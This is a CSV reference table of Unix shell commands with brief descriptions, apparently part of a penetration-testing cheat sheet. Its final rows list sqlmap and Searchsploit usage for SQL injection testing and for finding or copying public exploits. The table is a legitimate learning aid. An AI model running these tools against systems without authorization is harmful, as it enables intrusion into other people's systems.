CommandID,Command,Comment,Program
747, fold,Wrap text to fit a specified width,Shell
748, for,"Expand words, and execute commands",Shell
749, format,Format disks or tapes,Shell
750, free,Display memory usage,Shell
751, fsck,File system consistency check and repair,Shell
752, ftp,File Transfer Protocol,Shell
753, function,Define Function Macros,Shell
754, fuser,Identify/kill the process that is accessing a file,Shell
755, gawk,Find and Replace text within files,Shell
756, getopts,Parse positional parameters,Shell
757, grep,Search files for lines that match a given pattern,Shell
758, groupadd,Add a user security group,Shell
759, groupdel,Delete a group,Shell
760, groupmod,Modify a group,Shell
761, groups,Print group names a user is in,Shell
762, gzip,Compress or decompress named files,Shell
763, hash,Remember the full pathname of a name argument,Shell
764, head,Output the first part of files,Shell
765, help,Display help for a built-in command,Shell
766, history,Command History,Shell
767, hostname,Print or set system name,Shell
768, iconv,Convert the character set of a file,Shell
769, id,Print user and group id’s,Shell
770, if,Conditionally perform a command,Shell
771, ifconfig,Configure a network interface,Shell
772, ifdown,Stop a network interface,Shell
773, ifup,Start a network interface up,Shell
774, import,Capture an X server screen and save the image to file,Shell
775, install,Copy files and set attributes,Shell
776, jobs,List active jobs,Shell
777, join,Join lines on a common field,Shell
778, kill,Stop a process from running,Shell
779, killall,Kill processes by name,Shell
780, less,Display output one screen at a time,Shell
781, let,Perform arithmetic on shell variables,Shell
782, ln,Create a symbolic link to a file,Shell
783, local,Create variables,Shell
784,locate,Find files,Shell
785, logname,Print current login name,Shell
786, logout,Exit a login shell,Shell
787, look,Display lines beginning with a given string,Shell
788, lpc,Line printer control program,Shell
789, lpr,Off line print,Shell
790, lprint,Print a file,Shell
791, lprintd,Abort a print job,Shell
792, lprintq,List the print queue,Shell
793, lprm,Remove jobs from the print queue,Shell
794, ls,List information about files,Shell
795, lsof,List open files,Shell
796, make,Recompile a group of programs,Shell
797, man,Help manual,Shell
798, mkdir,Create new folders,Shell
799, mkfifo,Make FIFOs (named pipes),Shell
800, mkisofs,Create an hybrid ISO9660/JOLIET/HFS filesystem,Shell
801, mknod,Make block or character special files,Shell
802, more,Display output one screen at a time,Shell
803, mount,Mount a file system,Shell
804, mtools,Manipulate MS-DOS files,Shell
805, mtr,Network diagnostics (traceroute/ping),Shell
806, mv,Move or rename files or directories,Shell
807, mmv,Mass Move and rename files,Shell
808, netstat,Networking information,Shell
809, nice,Set the priority of a command or job,Shell
810, nl,Number lines and write files,Shell
811, nohup,Run a command immune to hangups,Shell
812, notify-send,Send desktop notifications,Shell
813, nslookup,Query Internet name servers interactively,Shell
814, open,Open a file in its default application,Shell
815, op,Operator access,Shell
816, passwd,Modify a user password,Shell
817, paste,Merge lines of files,Shell
818, pathchk,Check file name portability,Shell
819, ping,Test a network connection,Shell
820, pkill,Stop processes from running,Shell
821, popd,Restore the previous value of the current directory,Shell
822, pr,Prepare files for printing,Shell
823, printcap,Printer capability database,Shell
824, printenv,Print environment variables,Shell
825, printf,Format and print data,Shell
826, ps,Process status,Shell
827, pushd,Save and then change the current directory,Shell
828, pwd,Print Working Directory,Shell
829, quota,Display disk usage and limits,Shell
830, quotacheck,Scan a file system for disk usage,Shell
831, quotactl,Set disk quotas,Shell
832, ram,ram disk device,Shell
833, rcp,Copy files between two machines,Shell
834, read,Read a line from standard input,Shell
835, readarray,Read from stdin into an array variable,Shell
836, readonly,Mark variables/functions as readonly,Shell
837, reboot,Reboot the system,Shell
838, rename,Rename files,Shell
839, renice,Alter priority of running processes,Shell
840, remsync,Synchronize remote files via email,Shell
841, return,Exit a shell function,Shell
842, rev,Reverse lines of a file,Shell
843, rm,Remove files,Shell
844, rmdir,Remove folders,Shell
845, rsync,Remote file copy (Synchronize file trees),Shell
846, screen,"Multiplex terminal, run remote shells via ssh",Shell
847, scp,Secure copy (remote file copy),Shell
848, sdiff,Merge two files interactively,Shell
849, sed,Stream Editor,Shell
850, select,Accept keyboard input,Shell
851, seq,Print numeric sequences,Shell
852, set,Manipulate shell variables and functions,Shell
853, sftp,Secure File Transfer Program,Shell
854, shift,Shift positional parameters,Shell
855, shopt,Shell Options,Shell
856, shutdown,Shutdown or restart linux,Shell
857, sleep,Delay for a specified time,Shell
858, slocate,Find files,Shell
859, sort,Sort text files,Shell
860, source,Run commands from a file,Shell
861, split,Split a file into fixed-size pieces,Shell
862, ssh,Secure Shell client (remote login program),Shell
863, strace,Trace system calls and signals,Shell
864, su,Substitute user identity,Shell
865, sudo,Execute a command as another user,Shell
866, sum,Print a checksum for a file,Shell
867, suspend,Suspend execution of this shell,Shell
868, symlink,Make a new name for a file,Shell
869, sync,Synchronize data on disk with memory,Shell
870, tail,Output the last part of file,Shell
871, tar,Tape Archiver,Shell
872, tee,Redirect output to multiple files,Shell
873, test,Evaluate a conditional expression,Shell
874, time,Measure Program running time,Shell
875, times,User and system times,Shell
876, touch,Change file timestamps,Shell
877, top,List processes running on the system,Shell
878, traceroute,Trace Route to Host,Shell
879, trap,Run a command when a signal is set(bourne),Shell
880, tr,"Translate, squeeze, and/or delete characters",Shell
881, true,"Do nothing, successfully",Shell
882, tsort,Topological sort,Shell
883, tty,Print filename of terminal on stdin,Shell
884, type,Describe a command,Shell
885,ulimit,Limit user resources,Shell
886, umask,Users file creation mask,Shell
887, umount,Unmount a device,Shell
888, unalias,Remove an alias,Shell
889, uname,Print system information,Shell
890, unexpand,Convert spaces to tabs,Shell
891, uniq,Uniquify files,Shell
892, units,Convert units from one scale to another,Shell
893, unset,Remove variable or function names,Shell
894, unshar,Unpack shell archive scripts,Shell
895, until,Execute commands (until error),Shell
896, uptime,Show uptime,Shell
897, useradd,Create new user account,Shell
898, usermod,Modify user account,Shell
899, users,List users currently logged in,Shell
900, uuencode,Encode a binary file,Shell
901, uudecode,Decode a file created by uuencode,Shell
902, v,Verbosely list directory contents (`ls -l -b’),Shell
903, vdir,Verbosely list directory contents (`ls -l -b’),Shell
904, vi,Text Editor,Shell
905, vmstat,Report virtual memory statistics,Shell
906, wait,Wait for a process to complete,Shell
907, watch,Execute/display a program periodically,Shell
908, wc,"Print byte, word, and line counts",Shell
909, whereis,"Search the user’s $path, man pages and source files for a program",Shell
910, which,Search the user’s $path for a program file,Shell
911, while,Execute commands,Shell
912, who,Print all usernames currently logged in,Shell
913, whoami,Print the current user id and name (`id -un’),Shell
914, wget,"Retrieve web pages or files via HTTP, HTTPS or FTP",Shell
915, write,Send a message to another user,Shell
916, xargs,"Execute utility, passing constructed argument lists",Shell
917, xdg-open,Open a file or URL in the user’s preferred application,Shell
918, yes,Print a string until interrupted,Shell
919,sqlmap -r <request form.txt>,make a request using a form saved form burp/ZAP,SQLMap
920,Searchsploit -p <exploit>,shows path to the exploit,Searchsploit
921,Searchsploit -m <exploit>,Paste exploit in the current directory,Searchsploit
922,Searchsploit -x <exploit>,open exploit with vi,Searchsploit
